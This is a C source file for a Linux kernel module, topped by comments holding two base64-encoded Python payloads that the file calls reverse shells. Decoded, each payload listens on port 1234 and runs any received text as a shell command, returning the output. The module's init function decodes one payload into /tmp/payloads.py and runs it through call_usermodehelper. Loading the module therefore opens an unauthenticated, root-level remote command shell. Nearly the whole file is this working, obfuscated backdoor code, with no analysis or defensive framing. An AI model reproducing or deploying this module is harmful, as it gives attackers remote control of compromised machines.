/* base64 command execution for decoding */

// base64 encoded Payload for reverse shell
// IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCkhPU1QgPSAnMC4wLjAuMCcKUE9SVCA9IDEyMzQKCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuYmluZCgoSE9TVCwgUE9SVCkpCnMubGlzdGVuKDEpCnByaW50KCJMaXN0ZW5pbmcgb24gcG9ydCAxMjM0IikKCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQogICAgcHJpbnQoIkNvbm5lY3Rpb24gQWNjZXB0ZWQgZnJvbToge30iLmZvcm1hdChhZGRyKSkKICAgIGRhdGEgPSBjb25uLnJlY3YoMTAyNCkuZGVjb2RlKCd1dGYtOCcpCiAgICB0cnk6CiAgICAgICAgaWYgZGF0YToKICAgICAgICAgICAgIyBFeGVjdXRlIHRoZSBjb21tYW5kIGFuZCBzZW5kIGJhY2sgdGhlIHJlc3VsdAogICAgICAgICAgICAjIHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGRhdGEuc3BsaXQoKSwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGRhdGEsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICAgICAgcmVzdWx0ID0gcHMuY29tbXVuaWNhdGUoKVswXQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXN1bHQgPSBzdHIoZSkuZW5jb2RlKCd1dGYtOCcpCgogICAgY29ubi5zZW5kKHJlc3VsdCkKICAgIGNvbm4uY2xvc2UoKQo=


// base64 encoded payload for reverse shell with pid and ppid
// IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmltcG9ydCBvcwoKSE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gMTIzNAoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5iaW5kKChIT1NULCBQT1JUKSkKcy5saXN0ZW4oMSkKcHJpbnQoIkxpc3RlbmluZyBvbiBwb3J0IDEyMzQiKQoKd2hpbGUgVHJ1ZToKICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICBwcmludCgiQ29ubmVjdGlvbiBBY2NlcHRlZCBmcm9tOiB7fSIuZm9ybWF0KGFkZHIpKQogICAgZGF0YSA9IGNvbm4ucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykKICAgIHRyeToKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgYW5kIHNlbmQgYmFjayB0aGUgcmVzdWx0CiAgICAgICAgICAgICMgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZGF0YS5zcGxpdCgpLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJlc3VsdCA9IHN0cihlKS5lbmNvZGUoJ3V0Zi04JykKCiAgICBjb25uLnNlbmQocmVzdWx0KQogICAgY29ubi5jbG9zZSgpCg==


#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>
#include <linux/delay.h>


// static struct task_struct *exec_task;
// static pid_t exec_pid;

// static void kill_exec_task(void)
// {
//     if (exec_task) {
//         send_sig(SIGTERM, exec_task, 1); // Send SIGTERM signal first
//         msleep_interruptible(1000); // Wait for 1 second

//         send_sig(SIGKILL, exec_task, 1); // If process is still running, send SIGKILL
//         printk(KERN_INFO "Killed the executed process\n");
//     }
// }

static int __init my_module_init(void)
{

    char *argv[] = { "/bin/bash", "-c", "echo 'IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmltcG9ydCBvcwoKSE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gMTIzNAoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5iaW5kKChIT1NULCBQT1JUKSkKcy5saXN0ZW4oMSkKcHJpbnQoIkxpc3RlbmluZyBvbiBwb3J0IDEyMzQiKQoKd2hpbGUgVHJ1ZToKICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICBwcmludCgiQ29ubmVjdGlvbiBBY2NlcHRlZCBmcm9tOiB7fSIuZm9ybWF0KGFkZHIpKQogICAgZGF0YSA9IGNvbm4ucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykKICAgIHRyeToKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgYW5kIHNlbmQgYmFjayB0aGUgcmVzdWx0CiAgICAgICAgICAgICMgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZGF0YS5zcGxpdCgpLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJlc3VsdCA9IHN0cihlKS5lbmNvZGUoJ3V0Zi04JykKCiAgICBjb25uLnNlbmQocmVzdWx0KQogICAgY29ubi5jbG9zZSgpCg==' | base64 -d > /tmp/payloads.py && python3 /tmp/payloads.py", NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret < 0) {
        pr_err("Failed to execute base64 command: %d\n", ret);
        return ret;
    }


    // // Get the current process's struct pid
    // struct pid *pid_struct = get_task_pid(current, PIDTYPE_PID);
    // if (!pid_struct) {
    //     pr_err("Failed to get the current process's struct pid\n");
    //     return -EINVAL;
    // }

    // // Get the struct task_struct of the executed process
    // exec_task = pid_task(pid_struct, PIDTYPE_PID);
    // if (!exec_task) {
    //     pr_err("Failed to find the executed process\n");
    //     return -EINVAL;
    // }

    // // Store the PID
    // exec_pid = pid_vnr(task_pid(exec_task)) + 1;
    

    return 0;
}

static void __exit my_module_exit(void)
{
    // // Kill the executed process
    // kill_exec_task();

    // // Print the captured PID
    // printk(KERN_INFO "Executed process PID: %d\n", exec_pid);
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");